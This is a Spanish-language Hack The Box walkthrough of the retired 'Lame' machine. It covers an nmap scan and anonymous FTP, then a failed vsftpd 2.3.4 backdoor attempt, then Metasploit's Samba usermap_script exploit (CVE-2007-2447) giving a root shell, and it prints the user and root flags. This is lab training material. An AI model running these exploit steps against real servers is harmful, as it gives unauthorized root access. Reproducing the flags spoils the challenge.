# Documentación de Explotación de Vulnerabilidades en la Máquina Lame
![Exploit VSFTPD]([Hack The Box/LAME - HTB/Pasted image 20240713002051.png)

![[Pasted image 20240713114126.png]]
![[Pasted image 20240713114221.png]]


Ubicación de la Máquina: [Hack The Box - Lame](https://app.hackthebox.com/machines/Lame)

## Resumen
Lame es una máquina de nivel principiante que requiere solo un exploit para obtener acceso root. Fue la primera máquina publicada en Hack The Box y a menudo era la primera máquina para nuevos usuarios antes de su retiro.

### Habilidades Requeridas
- Conocimiento básico de Linux.
- Enumeración de puertos y servicios.

### Habilidades Aprendidas
- Identificación de servicios vulnerables.
- Explotación de Samba.

### Explotación
La explotación es trivial en esta máquina. Después de intentar (y fallar) ingresar usando el vector de ataque "obvio" vsftpd, Samba se convierte en el único objetivo. Usando CVE-2007-2447, que convenientemente tiene un módulo de Metasploit asociado, se obtendrá inmediatamente una shell root. La bandera de usuario se puede obtener desde `/home/makis/user.txt` y la bandera de root desde `/root/root.txt`.

**Módulo:** `exploit/multi/samba/usermap_script`

## Objetivo
Este documento describe el proceso paso a paso para identificar y explotar las vulnerabilidades en la máquina `Lame` de Hack The Box. Se incluyen comandos y salidas detalladas, explicaciones de cada paso y referencias a las CVE relacionadas.

## Herramientas Utilizadas
- Ping
- Nmap
- FTP
- Metasploit

## Prerrequisitos
- Conocimiento básico de Linux y comandos de red.
- Instalación de herramientas de pentesting como `nmap`, `ftp` y `metasploit`.
- Conexión VPN a la red de Hack The Box.

---

¡A continuación, se presenta el paso a paso de la explotación de la máquina `Lame`!

## Pasos

### 1. Verificación de Conectividad
Primero, se verifica la conectividad con la máquina objetivo usando el comando `ping`:
```shell
ping 10.10.10.3
```

### 2. Escaneo de Puertos con Nmap
Se utiliza `nmap` para escanear los puertos abiertos y servicios en la máquina objetivo:
```shell
nmap -sV -sC -T 4 10.10.10.3
```
![[Pasted image 20240712005823.png]]

**Explicación de los comandos:**
- `-sV`: Detecta versiones de los servicios.
- `-sC`: Ejecuta scripts NSE estándar.
- `-T 4`: Aumenta la velocidad del escaneo.

**Salida del comando nmap:**
```
PORT    STATE SERVICE     VERSION                                 
21/tcp  open  ftp         vsftpd 2.3.4                            
| ftp-syst:                                                       
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.60
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h00m24s, deviation: 2h49m44s, median: 22s
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2024-07-12T01:57:01-04:00
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.76 seconds
```

### 3. Conexión al Servidor FTP
Se intenta acceder al servidor FTP utilizando las credenciales anónimas ya que el puerto 21 está abierto:
```shell
ftp 10.10.10.3
```
**Credenciales:**
- Usuario: `anonymous`
- Contraseña: (dejar en blanco)

### 4. Navegación en el Servidor FTP
```shell
ls -la
```
![[Pasted image 20240712124944.png]]

No se encontraron archivos importantes, por lo que se procede a descargar todos los archivos usando `wget`:
```shell
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.3
```
![[Pasted image 20240712125918.png]]

En la imagen anterior, se realizó un `ls -la` para ver si hay archivos y verificar si hay archivos ocultos, pero no se encontró nada. Se usa el siguiente comando para descargar los archivos en el servidor:
```shell
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.3
```
![[Pasted image 20240712130226.png]]

Ahora se realiza un `ls -la` y luego el comando `cat .listing` para ver qué hay:
![[Pasted image 20240712130505.png]]

Como se observa en la imagen anterior, no hay nada importante.

### 5. Búsqueda de Vulnerabilidades con Metasploit
Se inicia `msfconsole` y se busca la vulnerabilidad del `vsftpd`:
```shell
msfconsole
msf6 > search vsftpd 2.3.4
```
![[Pasted image 20240713002051.png]]

**Módulo encontrado:**
```
exploit/unix/ftp/vsftpd_234_backdoor
```

### 6. Configuración y Ejecución del Módulo de Explotación
Se configura el módulo para apuntar a la IP objetivo y se ejecuta:
```shell
use exploit/unix/ftp/vsftpd_234_backdoor
show options
set RHOSTS 10.10.10.3
run
```
![[Pasted image 20240713002605.png]]

```shell
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3       
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)           
[*] 10.10.10.3:21 - USER: 331 Please specify the password.                                                
[*] Exploit completed, but no session was created.       
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >                         
```

Como vemos, no se pudo, ya que tiene el firewall activado:
![[Pasted image 20240713002933.png]]

### 7. Explotación de Samba
Se busca una vulnerabilidad en el servicio Samba encontrado:
```shell
search samba 3.0.20
```
![[Pasted image 20240713003445.png]]

**Módulo encontrado:**
```
exploit/multi/samba/usermap_script
```

### 8. Configuración y Ejecución del Módulo de Samba
Se configura el módulo de Samba con la IP de la máquina llamada Lame y la IP del túnel OpenVPN:
```shell
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST <tu_ip_openvpn>
run
```
![[Pasted image 20240713004208.png]]

### 9. Escalada de Privilegios y Obtención de Flags
Una vez dentro del sistema, se navega para obtener las flags de usuario y root:
```shell
ls
id
```
![[Pasted image 20240713004543.png]]

Como vemos, somos usuario root. Ahora usamos el comando `which python` para ver si tiene Python y si tiene, sacamos la bash para tenerlo más interactivo:
```shell
which python 
python -c 'import pty; pty.spawn("/bin/bash")'
```
![[Pasted image 20240713005137.png]]

Ahora que estamos dentro, tenemos que buscar las flags o capturar la bandera para ponerla aquí:
![[Pasted image 20240713005223.png]]

Vamos a la terminal y busquemos esas flags:
```shell
root@lame:/# ls
ls
bin    etc         initrd.img.old  mnt        root  tmp      vmlinuz.old
boot   home        lib             nohup.out  sbin  usr
cdrom  initrd      lost+found      opt        srv   var
dev    initrd.img  media           proc       sys   vmlinuz
root@lame:/# cd home
cd home
root@lame:/home# dir
dir
ftp  makis  service  user
root@lame:/home# cd makis
cd makis
root@lame:/home/makis# dir
dir
user.txt
root@lame:/home/makis#

 cat user.txt
cat user.txt
f3560344ad8f0d3d08180264633c0029
root@lame:/home/makis# cd /root
cd /root
root@lame:/root# ls
ls
Desktop  reset_logs.sh  root.txt  vnc.log
root@lame:/root# cat root.txt
cat root.txt
a7a1eefa8d55d5acc99d6f4ee7a2517b
root@lame:/root# 
```
![[Pasted image 20240713005522.png]]
![[Pasted image 20240713005620.png]]

## Conclusión
Hemos logrado identificar y explotar las vulnerabilidades en la máquina `Lame` de Hack The Box, obteniendo acceso root y capturando las flags de usuario y root. Este proceso incluye el uso de herramientas de pentesting como `nmap`, `ftp` y `metasploit`, y demuestra la importancia de mantener los servicios y software actualizados para evitar vulnerabilidades conocidas.

Aquí tienes una versión mejorada y más estructurada de tu información:

---

## Creador de Documentación
### Redes Sociales:
- Facebook: [@santanaoliva_u](https://www.facebook.com/santanaoliva_u)
- Vk: [@santanaoliva_u](https://vk.com/santanaoliva_u)
- Instagram: [@santanaoliva_u](https://www.instagram.com/santanaoliva_u)
- Threads: [@santanaoliva_u](https://www.threads.net/@santanaoliva_u)
- Telegram: [@santanaoliva_u](https://t.me/santanaoliva_u)
- GitHub: [@santanaoliva_u](https://github.com/santanaoliva_u)
- X (anteriormente Twitter): [@santanaoliva_u](https://twitter.com/santanaoliva_u)
- YouTube: [@santanaoliva_u](https://www.youtube.com/@santanaoliva_u)
- Pinterest: [@santanaoliva_u](https://www.pinterest.com/santanaoliva_u)
- Tumblr: [@santanaoliva_u](https://santanaoliva_u.tumblr.com)
- LinkedIn: [@santanaoliva_u](https://www.linkedin.com/in/santanaoliva_u)
- TikTok: [@santanaoliva_u](https://www.tiktok.com/@santanaoliva_u)
- Twitch: [@santanaoliva_u](https://www.twitch.tv/santanaoliva_u)
- Spotify: [@santanaoliva_u](https://open.spotify.com/user/santanaoliva_u)
+ HackTheBox: https://ctf.hackthebox.com/user/profile/413504
